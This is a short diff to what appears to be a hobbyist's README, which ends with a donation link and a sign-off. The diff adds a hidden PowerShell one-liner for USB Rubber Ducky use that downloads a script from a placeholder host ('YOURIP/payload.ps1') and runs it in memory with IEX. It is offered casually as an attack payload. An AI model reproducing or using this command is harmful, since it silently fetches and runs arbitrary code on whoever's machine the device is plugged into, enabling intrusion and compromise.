@@ -17,3 +17,9 @@ PAYPAL: paypal.me/thegammerssimulant
 
 
 LOVE YALL HAVE FUN!!!
+
+
+
+if you have a USB rubber ducky 
+
+powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('http://YOURIP/payload.ps1');"
